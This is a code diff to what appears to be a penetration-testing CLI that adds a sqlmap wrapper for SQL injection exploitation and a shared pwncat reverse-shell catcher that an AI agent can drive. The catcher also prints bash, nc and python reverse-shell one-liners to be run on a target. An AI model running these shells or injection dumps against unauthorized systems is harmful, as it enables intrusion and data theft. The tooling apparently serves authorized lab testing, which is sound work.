@@ -13,12 +13,14 @@ Subcommands:
   vhost <ip> <domain>             vhost (Host-header) enum for an internal IP
   dns <domain>                    DNS subdomain enum for an external domain
   dirbust <url>                   recursive directory/file brute (SecLists)
+  sqlmap [args...]                automated SQL injection detection + exploitation
   recon <target>                  simple one-shot phased scan
   vol <image> <plugin|creds|strings>  offline memory forensics (volatility3) on a RAM dump
   report <target>                 assemble per-port facts + notes into report.md
   vpn <up|down|status> [config]   manage the OpenVPN sidecar
   proxy <up|down|status>          SOCKS5 egress for host tools (browser/Burp/curl)
   shell [cmd...]                  interactive operator shell in the tunnel namespace
+  catch <up|attach|status|send|capture|down> [port|cmd]  persistent shared reverse-shell catcher (pwncat)
   responder [args...]             LLMNR/NBT-NS/mDNS poisoning + capture (tunnel iface)
   ip                              print the tunnel IP (your LHOST)
   fwd <port> [--stop]             bridge a tunnel port to a host listener
@@ -42,6 +44,7 @@ import argparse
 import hashlib
 import json
 import os
+import random
 import re
 import shlex
 import shutil
@@ -914,6 +917,41 @@ def cmd_vulns(args):
         die(f"vuln-research worker exited {r.returncode}")
 
 
+# --- subcommand: sqlmap (automated SQLi detection + exploitation) -----------
+def cmd_sqlmap(args):
+    """Run sqlmap against a target (honors ROO_NET / the tunnel)."""
+    require_docker()
+    ref = ensure_image("sqlmap")
+    rest = list(args.args or [])
+    if not rest:
+        rest = ["--help"]
+    injected = []
+    # Non-interactive by default — sqlmap prompts (y/N questions) would hang a
+    # container with no TTY/stdin. --batch takes its default answers; the operator
+    # can still pass explicit flags. Skip if the user already set it.
+    if "--batch" not in rest:
+        injected.append("--batch")
+    # Persist sqlmap's session + dumps under /work (cwd) so confirmed injection
+    # points are cached (fast credentialed re-runs) and loot survives the --rm
+    # container. sqlmap's default --output-dir lives inside the image and vanishes
+    # on exit. It nests results by target host (recon-results/sqlmap/<host>/).
+    if not any(a == "--output-dir" or a.startswith("--output-dir=") for a in rest):
+        outdir = Path("recon-results") / "sqlmap"
+        outdir.mkdir(parents=True, exist_ok=True)
+        injected += ["--output-dir", _cpath(outdir)]
+    # Name the container (roorecon-sqlmap-<pid>) so it's findable, killable, and
+    # swept by the teardown skill. A detached --rm container outlives the host
+    # process that launched it — TaskStop/Ctrl-C orphans it, and it keeps hitting
+    # the target + holding the session lock until `docker rm -f`. The roorecon-*
+    # prefix is what teardown greps for; the pid keeps intentional concurrent runs
+    # (different targets) from clashing on the name.
+    name = os.environ.get("ROO_NAME") or f"roorecon-sqlmap-{os.getpid()}"
+    # Target-facing → use_net default True, so it reaches a VPN-only target; ./hosts
+    # is mounted so lab vhosts resolve. tty for the live progress bar.
+    r = _docker_run("sqlmap", ref, injected + rest, name=name, tty=True)
+    sys.exit(r.returncode)
+
+
 # --- subcommand: vol (offline memory forensics via volatility3) -------------
 # Memory-image analysis is offline loot processing — like hashcat, it never
 # touches the target or the VPN. It runs volatility3 (+ pypykatz, strings) in a
@@ -1252,8 +1290,48 @@ def _spawn_detached(cmd):
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
+def _browser_stop(profile, cdp):
+    """Kill only the roo-profile browser, leaving the operator's other browsers alone.
+
+    Match on the unique `--user-data-dir=<roo profile>` marker (the CDP port as a
+    fallback) — the BloodHound browser uses a *different* profile, so it's untouched.
+    Idempotent: nothing matching → nothing to do, never an error.
+    """
+    marker = str(profile)
+    if sys.platform.startswith("win"):
+        # CommandLine match via CIM; -match takes a regex, so escape the path. Cover
+        # the Chromium-family exe names roo might have launched.
+        ps = (
+            "$names=@('chrome.exe','msedge.exe','brave.exe','chromium.exe');"
+            "$m=[regex]::Escape('" + marker.replace("'", "''") + "');"
+            "$p=Get-CimInstance Win32_Process | "
+            "Where-Object { $names -contains $_.Name -and $_.CommandLine -match $m };"
+            "if($p){ $p | ForEach-Object { Stop-Process -Id $_.ProcessId -Force "
+            "-ErrorAction SilentlyContinue }; ($p | Measure-Object).Count } else { 0 }"
+        )
+        r = subprocess.run(["powershell", "-NoProfile", "-NonInteractive", "-Command", ps],
+                           capture_output=True, text=True)
+        n = (r.stdout or "").strip().splitlines()[-1:] or ["0"]
+        killed = n[0].strip() if n else "0"
+    else:
+        # pgrep -f matches the full cmdline; the abs profile path is unique to ours.
+        r = subprocess.run(["pgrep", "-f", marker], capture_output=True, text=True)
+        pids = [p for p in (r.stdout or "").split() if p.isdigit()]
+        for pid in pids:
+            subprocess.run(["kill", pid], stderr=subprocess.DEVNULL)
+        killed = str(len(pids))
+    if killed and killed != "0":
+        ok(f"roo browser stopped ({killed} process(es) killed)")
+    else:
+        info("no roo browser running (profile not in use)")
+
+
 def cmd_browser(args):
     """Launch a host browser, VPN-proxied and CDP-instrumentable by the agent."""
+    profile = (Path(".roo") / "browser-profile").resolve()
+    if getattr(args, "stop", False):
+        _browser_stop(profile, args.cdp_port)
+        return
     require_docker()
     browser = _find_browser(args.browser)
     if not browser:
@@ -1266,7 +1344,6 @@ def cmd_browser(args):
             info("SOCKS proxy not up — starting it")
             _proxy_up()
         proxy_flags = [f"--proxy-server=socks5://127.0.0.1:{SOCKS_PORT}"]
-    profile = (Path(".roo") / "browser-profile").resolve()
     profile.mkdir(parents=True, exist_ok=True)
     cdp = str(args.cdp_port)
     cmd = [browser,
@@ -1675,6 +1752,115 @@ def cmd_shell(args):
     sys.exit(r.returncode)
 
 
+# --- subcommand: catch (persistent, shared reverse-shell catcher) -----------
+# A reverse-shell catcher that BOTH the operator and the agent can drive, and
+# that survives either of them dropping out. The primitive: pwncat-cs (platform
+# detection + upload/download) running inside a tmux session inside a *detached*
+# net-toolbox container bound to the tunnel namespace (so the listener is at the
+# tunnel IP and revshells come back over the VPN). The operator attaches a TTY
+# (`roo catch attach`); the agent drives non-interactively (`send`/`capture`) —
+# both hit the same tmux session, so it's one shared shell, drop-in/drop-out.
+# Named roorecon-catch-<port> so it's killable and the teardown skill sweeps it.
+CATCH_PREFIX = "roorecon-catch-"
+# Downloads land here by default (host-visible, git-ignored), per the feature spec.
+CATCH_DIR = "/work/.roo/catch"
+
+
+def _catch_list():
+    r = subprocess.run(["docker", "ps", "--format", "{{.Names}}"],
+                       stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+    return [n for n in r.stdout.split() if n.startswith(CATCH_PREFIX)]
+
+
+def _catch_pick(rest):
+    """Resolve which catcher to act on: an explicit port arg, else the only one."""
+    names = _catch_list()
+    if rest:
+        want = f"{CATCH_PREFIX}{rest[0]}"
+        if want not in names:
+            die(f"no catcher on port {rest[0]} (running: {', '.join(names) or 'none'})")
+        return want
+    if not names:
+        die("no catcher running — start one with `roo catch up`")
+    if len(names) > 1:
+        die(f"multiple catchers running ({', '.join(names)}); pass the port, e.g. "
+            f"`roo catch attach {names[0].rsplit('-', 1)[1]}`")
+    return names[0]
+
+
+def cmd_catch(args):
+    """Persistent, shared reverse-shell catcher (pwncat in tmux) — you and the agent both drive."""
+    require_docker()
+    action = args.action
+    rest = list(args.rest or [])
+
+    if action == "up":
+        _require_vpn("roo catch")
+        ref = ensure_image("net-toolbox")
+        port = rest[0] if rest else str(random.randint(40000, 60000))
+        if not port.isdigit() or not (0 < int(port) < 65536):
+            die(f"port must be 1-65535 (got '{port}')", 2)
+        name = f"{CATCH_PREFIX}{port}"
+        subprocess.run(["docker", "rm", "-f", name],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        (Path(".roo") / "catch").mkdir(parents=True, exist_ok=True)
+        # Start pwncat in a detached tmux session, then keep PID 1 alive only while
+        # that session exists (container stops when the catch ends). Both `attach`
+        # (operator TTY) and `send`/`capture` (agent) reach it via `docker exec`.
+        inner = (f"tmux new-session -d -s catch -x 220 -y 50 'pwncat-cs -lp {port}'; "
+                 f"while tmux has-session -t catch 2>/dev/null; do sleep 2; done")
+        cmd = (["docker", "run", "-d", "--name", name,
+                "--network", f"container:{VPN_CONTAINER}"]
+               + _hosts_mount() + _home_mount() + _work_mount() + _tools_mount()
+               + ["-w", CATCH_DIR, ref, "sh", "-c", inner])
+        subprocess.run(cmd, stdout=subprocess.DEVNULL, check=True)
+        tun = _tun_addr()
+        ok(f"catcher up — pwncat listening on {tun}:{port}  (container {name})")
+        info("set one of these on the target (revshell back to us):")
+        print(f"    bash -i >& /dev/tcp/{tun}/{port} 0>&1")
+        print(f"    nc {tun} {port} -e /bin/bash")
+        print(f"    python3 -c 'import socket,os,pty;s=socket.socket();"
+              f"s.connect((\"{tun}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];"
+              f"pty.spawn(\"/bin/bash\")'")
+        info("you drive:    roo catch attach        (detach with Ctrl-b d; session persists)")
+        info("agent drives: roo catch send <cmd>  ·  roo catch capture")
+        info("files:        downloads land in .roo/catch/ ; stop with  roo catch down")
+        return
+
+    if action == "down":
+        targets = [_catch_pick(rest)] if rest else _catch_list()
+        if not targets:
+            info("no catcher running")
+            return
+        for n in targets:
+            subprocess.run(["docker", "rm", "-f", n],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        ok(f"catcher(s) stopped: {', '.join(targets)}")
+        return
+
+    # send/capture never take a port (rest is the command / empty); attach/status
+    # take an optional port in rest[0]. All require an existing catcher.
+    name = _catch_pick([] if action in ("send", "capture") else rest)
+
+    if action == "attach":
+        r = subprocess.run(["docker", "exec", "-it", name, "tmux", "attach", "-t", "catch"])
+        sys.exit(r.returncode)
+    if action == "status":
+        ok(f"catcher {name} running — recent session output:")
+        subprocess.run(["docker", "exec", name, "tmux", "capture-pane", "-pt", "catch", "-S", "-40"])
+        return
+    if action == "send":
+        if not rest:
+            die("usage: roo catch send <command...>")
+        cmdstr = " ".join(rest)
+        subprocess.run(["docker", "exec", name, "tmux", "send-keys", "-t", "catch", cmdstr, "Enter"])
+        info(f"sent to {name}: {cmdstr}   (read output with `roo catch capture`)")
+        return
+    if action == "capture":
+        subprocess.run(["docker", "exec", name, "tmux", "capture-pane", "-pt", "catch", "-S", "-200"])
+        return
+
+
 def cmd_responder(args):
     """Run Responder in the tunnel namespace: LLMNR/NBT-NS/mDNS poisoning + capture.
 
@@ -2003,6 +2189,12 @@ def build_parser():
     pvln.add_argument("--out", default="recon-results")
     pvln.set_defaults(func=cmd_vulns)
 
+    psql = sub.add_parser("sqlmap",
+                          help="automated SQL injection detection + exploitation (honors ROO_NET)")
+    psql.add_argument("args", nargs=argparse.REMAINDER,
+                      help="arguments passed straight to sqlmap (e.g. -u URL --cookie ... --dump)")
+    psql.set_defaults(func=cmd_sqlmap)
+
     pvol = sub.add_parser("vol", help="offline memory forensics via volatility3 (creds/artifacts from a dump)")
     pvol.add_argument("image", help="path to a memory image under cwd (.vmem/.dmp/.raw/hiberfil/lsass dump)")
     pvol.add_argument("plugin", help="volatility3 plugin (windows.info, windows.hashdump, …), "
@@ -2037,12 +2229,23 @@ def build_parser():
                      help="browse direct, not through the VPN SOCKS proxy")
     pbr.add_argument("--dry-run", dest="dry_run", action="store_true",
                      help="print the launch command without starting the browser")
+    pbr.add_argument("--stop", dest="stop", action="store_true",
+                     help="close the roo browser launched earlier (only the "
+                          "roo-profile instance, never your other browsers)")
     pbr.set_defaults(func=cmd_browser)
 
     psh = sub.add_parser("shell", help="interactive operator shell in the tunnel namespace")
     psh.add_argument("args", nargs=argparse.REMAINDER,
                      help="optional command to run instead of an interactive shell")
     psh.set_defaults(func=cmd_shell)
+
+    pcatch = sub.add_parser("catch",
+                            help="persistent, shared reverse-shell catcher (pwncat in tmux)")
+    pcatch.add_argument("action", choices=["up", "attach", "status", "send", "capture", "down"],
+                        help="up [port] | attach [port] | status [port] | send <cmd...> | capture | down [port]")
+    pcatch.add_argument("rest", nargs=argparse.REMAINDER,
+                        help="port (up/attach/status/down) or command words (send)")
+    pcatch.set_defaults(func=cmd_catch)
 
     prs = sub.add_parser("responder",
                          help="Responder (LLMNR/NBT-NS/mDNS poisoning + capture) on the tunnel iface")
@@ -2102,6 +2305,10 @@ def main():
         return cmd_hashcat(argparse.Namespace(args=argv[1:], func=cmd_hashcat))
     if argv and argv[0] == "responder":
         return cmd_responder(argparse.Namespace(args=argv[1:], func=cmd_responder))
+    # sqlmap is invoked with leading flags (`roo sqlmap -u … --dump`); argparse
+    # REMAINDER drops a leading `-flag`, so capture everything after the verb here.
+    if argv and argv[0] == "sqlmap":
+        return cmd_sqlmap(argparse.Namespace(args=argv[1:], func=cmd_sqlmap))
     args = build_parser().parse_args()
     args.func(args)
 
